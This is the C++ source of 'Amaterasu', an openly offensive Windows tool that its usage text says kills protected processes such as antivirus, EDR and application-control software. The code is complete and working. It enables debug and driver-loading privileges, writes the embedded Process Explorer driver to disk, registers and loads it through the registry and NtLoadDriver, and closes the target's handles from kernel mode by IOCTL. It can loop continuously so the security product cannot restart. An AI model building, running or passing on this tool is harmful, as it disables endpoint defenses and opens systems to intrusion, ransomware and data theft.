#include <string>
#include "ntdll.h"
#include "resource.h"

#pragma comment(lib, "ntdll.lib")

#define IOCTL_CLOSE_HANDLE 0x83350004

typedef struct {
    DWORD  dwPID;
    PVOID  pvObject;
    DWORD  dwSize;
    HANDLE hProcess;
} PROCEXP_STRUCT;

void printUsage(wchar_t* exe) {
    wprintf(L"\n[ABOUT]\n\tAmaterasu terminates, or inhibits, protected processes such as application control and AV/EDR solutions"
        L" by leveraging the Sysinternals Process Explorer driver to kill a process's handles from kernel mode. For protected"
        L" processes which attempt to restore its handles or restarts itself, supply a process name (partial match) and Amaterasu"
        L" will continuously kill any handles that are associated with that name until you tell it to stop [ESC]. Otherwise, supply"
        L" the process ID and Amaterasu will stop after the process is terminated. Inspired from 'Backstab' by @Yas_o_h.\n\n"
        L"[USAGE]\n\t.\\Amaterasu.exe -[name|id] [Process Name or ID]\n\n"
    );
}

void printBanner() {
    wprintf(L"\n    ___                    __                            "
        "\n   /   |  ____ ___  ____ _/ /____  _________ ________  __"
        "\n  / /| | / __ `__ \\/ __ `/ __/ _ \\/ ___/ __ `/ ___/ / / /"
        "\n / ___ |/ / / / / / /_/ / /_/  __/ /  / /_/ (__  ) /_/ / "
        "\n/_/  |_/_/ /_/ /_/\\__,_/\\__/\\___/_/   \\__,_/____/\\__,_/\n\n"
    );
}

bool validateArgs(int &argc, wchar_t** &argv, bool &isPID, int &targetPID, LPCWSTR &targetName) {
    bool isValid = false;
    if (argc == 3) {
        if ((_wcsicmp(argv[1], L"-name") ) == 0) {
            isPID = false;
            targetName = argv[2];
            isValid = true;
        } else if ((_wcsicmp(argv[1], L"-id")) == 0) {
            isPID = true;
            targetPID = _wtoi(argv[2]);
            if (targetPID != 0) {
                isValid = true;
            }
        }
    }
    if (!isValid) {
        printUsage(argv[0]);
    }
    return isValid;
}

bool isElevated() {
    BOOL isElevated = false;
    HANDLE curToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &curToken)) {
        TOKEN_ELEVATION tokenElevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(curToken, TokenElevation, &tokenElevation, sizeof(tokenElevation), &cbSize)) {
            isElevated = tokenElevation.TokenIsElevated;
        }
    }
    if (curToken) {
        CloseHandle(curToken);
    }
    return isElevated;
}

bool getPrivilege(HANDLE &hToken, LPCWSTR lpPrivilegeName) {
    TOKEN_PRIVILEGES tokenPrivileges;
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValueW(NULL, lpPrivilegeName, &tokenPrivileges.Privileges[0].Luid)) {
        return false;
    }
    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL)) {
        return false;
    }
    return true;
}

bool hasPrivileges() {
    BOOL hasPrivileges = false;
    HANDLE curToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &curToken)) {
        if (getPrivilege(curToken, L"SeDebugPrivilege") && getPrivilege(curToken, L"SeLoadDriverPrivilege")) {
            hasPrivileges = true;
        }
    }
    if (curToken) {
        CloseHandle(curToken);
    }
    return hasPrivileges;
}

std::wstring getWritePath() {
    WCHAR curDir[MAX_PATH + 1];
    GetCurrentDirectoryW(MAX_PATH + 1, curDir);
    return curDir + std::wstring(L"\\PROCEXP152.sys");
}

bool getResource(LPVOID &lpLock, DWORD &dwResource) {
    HRSRC hrResource = FindResource(NULL, MAKEINTRESOURCE(IDR_DRIVER), RT_RCDATA);
    if (!hrResource) {
        wprintf(L"\t[*] Failed to locate resource\n");
        return false;
    }

    HGLOBAL hgResource = LoadResource(NULL, hrResource);
    if (!hgResource) {
        wprintf(L"\t[*] Failed to load resource\n");
        return false;
    }

    lpLock = LockResource(hgResource);
    if (!lpLock) {
        wprintf(L"\t[*] Failed to lock resource\n");
        return false;
    }

    dwResource = SizeofResource(NULL, hrResource);
    if (dwResource == 0) {
        wprintf(L"\t[*] Failed to get resource size\n");
        return false;
    }

    FreeResource(hgResource);
    return true;
}

bool writeDriver() {
    LPVOID lpLock;
    DWORD dwResource;
    if (!getResource(lpLock, dwResource)) {
        return false;
    }

    HANDLE hFile = CreateFileW(getWritePath().c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"\t[*] Failed to create PROCEXP152.sys\n");
        return false;
    }

    DWORD dwBytesWritten;
    if (!WriteFile(hFile, lpLock, dwResource, &dwBytesWritten, NULL)) {
        wprintf(L"\t[*] Failed to write to PROCEXP152.sys\n");
        return false;
    }

    CloseHandle(hFile);
    return true;
}

bool deleteDriver() {
    return DeleteFileW(getWritePath().c_str());
}

bool setRegistryKeys() {
    WCHAR regPath[MAX_PATH] = L"System\\CurrentControlSet\\Services\\Amaterasu";
    HKEY hKey = NULL;
    DWORD dwDisposition = 0;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return false;
    }

    DWORD dwData = 0;
    std::wstring driverPath(L"\\??\\" + getWritePath());
    if (RegSetValueEx(hKey, L"Type", 0, REG_DWORD, (BYTE*)&dwData, sizeof(DWORD)) ||
        RegSetValueEx(hKey, L"ErrorControl", 0, REG_DWORD, (BYTE*)&dwData, sizeof(DWORD)) ||
        RegSetValueEx(hKey, L"Start", 0, REG_DWORD, (BYTE*)&dwData, sizeof(DWORD)) ||
        RegSetValueEx(hKey, L"ImagePath", 0, REG_SZ, (const BYTE*)driverPath.c_str(), (DWORD)(sizeof(wchar_t) * (wcslen(driverPath.c_str()) + 1)))
        ) {
        return false;
    }
    return true;
}

bool loadDriver() {
    WCHAR regPath[MAX_PATH] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Amaterasu";
    UNICODE_STRING uDriverServiceName = { 0 };
    RtlInitUnicodeString(&uDriverServiceName, regPath);
    NTSTATUS ntStatus = NtLoadDriver(&uDriverServiceName);
    if (ntStatus != STATUS_SUCCESS && ntStatus != STATUS_IMAGE_ALREADY_LOADED && ntStatus != STATUS_OBJECT_NAME_COLLISION) {
        return false;
    }
    return true;
}

bool unloadDriver() {
    WCHAR regPath[MAX_PATH] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Amaterasu";
    UNICODE_STRING uDriverServiceName = { 0 };
    RtlInitUnicodeString(&uDriverServiceName, regPath);
    NTSTATUS ntStatus = NtUnloadDriver(&uDriverServiceName);
    if (ntStatus != STATUS_SUCCESS && ntStatus != STATUS_IMAGE_ALREADY_LOADED && ntStatus != STATUS_OBJECT_NAME_COLLISION) {
        return false;
    }
    return true;
}

HANDLE connectToDriver() {
    HANDLE hProcExp = CreateFileW(L"\\\\.\\PROCEXP152", GENERIC_ALL, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hProcExp == INVALID_HANDLE_VALUE) {
        return NULL;
    }
    return hProcExp;
}

HANDLE getProcessFromPID(int pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess || hProcess == 0 || hProcess == INVALID_HANDLE_VALUE) {
        return INVALID_HANDLE_VALUE;
    } else {
        return hProcess;
    }
}

std::wstring exeFromPath(wchar_t* exe) {
    std::wstring exeName(exe);
    auto i = std::find(exeName.rbegin(), exeName.rend(), '\\');
    if (i != exeName.rend()) {
        exeName.erase(exeName.begin(), i.base());
    }
    return exeName;
}

bool doesExeNameMatch(WCHAR* imagePath, LPCWSTR targetName) {
    return _wcsnicmp(exeFromPath(imagePath).c_str(), targetName, wcslen(targetName)) == 0;
}

PSYSTEM_HANDLE_INFORMATION reallocHandleTableSize(ULONG dwBytes, PSYSTEM_HANDLE_INFORMATION pHandleInfo) {
    HANDLE hHeap = GetProcessHeap();
    HeapFree(hHeap, HEAP_NO_SERIALIZE, pHandleInfo);
    pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwBytes);
    return pHandleInfo;
}

PSYSTEM_HANDLE_INFORMATION getSystemHandleInfo() {
    NTSTATUS status;
    PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
    ULONG ulSystemInfoLength = sizeof(SYSTEM_HANDLE_INFORMATION) + (sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO) * 100) - 2300;
    pHandleInfo = reallocHandleTableSize(ulSystemInfoLength, pHandleInfo);
    while ((status = NtQuerySystemInformation(SystemHandleInformation, pHandleInfo, ulSystemInfoLength, NULL)) == STATUS_INFO_LENGTH_MISMATCH) {
        pHandleInfo = reallocHandleTableSize(ulSystemInfoLength *= 2, pHandleInfo);
    }
    return pHandleInfo;
}

bool ioctlCloseHandle(SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo, HANDLE hDriver) {
    PROCEXP_STRUCT ioData = { 0 };
    ioData.dwPID = handleInfo.UniqueProcessId;
    ioData.pvObject = handleInfo.Object;
    ioData.dwSize = 0;
    ioData.hProcess = (HANDLE)handleInfo.HandleValue;
    if (!DeviceIoControl(hDriver, IOCTL_CLOSE_HANDLE, (LPVOID)&ioData, sizeof(PROCEXP_STRUCT), NULL, 0, NULL, NULL)) {
        return false;
    }
    return true;
}

void killProcessHandles(HANDLE hDriver, HANDLE hProcess) {
    DWORD dwPID = GetProcessId(hProcess);
    PSYSTEM_HANDLE_INFORMATION pHandleInfo = getSystemHandleInfo();
    for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = pHandleInfo->Handles[i];
        if (handleInfo.UniqueProcessId == dwPID) {
            ioctlCloseHandle(handleInfo, hDriver);
        }
    }
}

void killProcessHandles(HANDLE hDriver, LPCWSTR targetName) {
    int counter = 1;
    while (true) {
        if (GetAsyncKeyState(VK_ESCAPE)) {
            wprintf(L"\n");
            break;
        }
        wprintf(L"\r\t[>] Looped %d times", counter);
        PSYSTEM_HANDLE_INFORMATION pHandleInfo = getSystemHandleInfo();
        for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++) {
            SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = pHandleInfo->Handles[i];
            HANDLE hProcess = getProcessFromPID(handleInfo.UniqueProcessId);
            if (hProcess != INVALID_HANDLE_VALUE) {
                WCHAR imagePath[MAX_PATH] = { 0 };
                if (GetModuleFileNameExW(hProcess, NULL, imagePath, MAX_PATH)) {
                    if (doesExeNameMatch(imagePath, targetName)) {
                        ioctlCloseHandle(handleInfo, hDriver);
                    }
                }
                CloseHandle(hProcess);
            }
        }
        counter++;
    }
}

int wmain(int argc, wchar_t** argv) {
    bool    isPID;                  // Amaterasu called with '-id'
    int     targetPID;              // Target PID  (if  isPID)
    LPCWSTR targetName;             // Target Name (if !isPID)
    HANDLE  hDriver{};              // Handle to the PROCEXP152
    bool    wroteDriver;            // Successfully wrote a copy of PROCEXP152, to delete
    bool    loadedDriver{};         // Successfully loaded PROCEXP152, to unload
    bool    hasFailed = false;      // Prevents executing other stages while allowing us to clean up

    /* kewl */
    printBanner();

    /* Validate and process arguments */
    if (!validateArgs(argc, argv, isPID, targetPID, targetName)) {
        return 1;
    }

    /* Ensure we ran as administrator and can get the required privileges */
    wprintf(L"[+] Checking for required privileges\n");
    if (!isElevated()) {
        wprintf(L"\t[*] You must run this with administrator privileges\n");
        return 1;
    }
    if (!hasPrivileges()) {
        wprintf(L"\t[*] Failed to get SeDebugPrivilege & SeLoadDriverPrivilege\n");
        return 1;
    }

    /* Write, load, and connect to the PROCEXP152 driver */
    wprintf(L"[+] Loading and connecting to the driver\n");
    wroteDriver = writeDriver();
    if (!wroteDriver) {
        hasFailed = true;
    }
    if (!hasFailed) {
        if (!setRegistryKeys()) {
            wprintf(L"\t[*] Failed to update the registry\n");
            hasFailed = true;
        }
    }
    if (!hasFailed) {
        loadedDriver = loadDriver();
        if (!loadedDriver) {
            wprintf(L"\t[*] Failed to load the driver\n");
            hasFailed = true;
        }
    }
    if (!hasFailed) {
        hDriver = connectToDriver();
        if (hDriver == INVALID_HANDLE_VALUE || hDriver == 0) {
            wprintf(L"\t[*] Failed to connect to driver\n");
            hasFailed = true;
        }
    }

    /* Terminate either a specific ID or continuously loop over system handles to kill anything matching our process name */
    if (!hasFailed) {
        if (isPID) {
            HANDLE hProcess = getProcessFromPID(targetPID);
            if (hProcess != INVALID_HANDLE_VALUE) {
                wprintf(L"[+] Killing handles associated with the PID(%d)\n", targetPID);
                killProcessHandles(hDriver, hProcess);
                CloseHandle(hProcess);
            } else {
                wprintf(L"[*] Failed to locate process\n");
            }
        } else {
            wprintf(L"[+] Continuously killing handles that match the process name '%s*'\n", targetName);
            wprintf(L"    (Press the 'ESC' key to stop after the current iteration)\n");
            killProcessHandles(hDriver, targetName);
        }
    }

    /* Unload and delete our driver or we'll fail to write on the next run */
    wprintf(L"[+] Cleaning up\n");
    if (hDriver) {
        CloseHandle(hDriver);
    }
    if (loadedDriver) {
        unloadDriver();
    }
    if (wroteDriver) {
        deleteDriver();
    }

    return 0;
}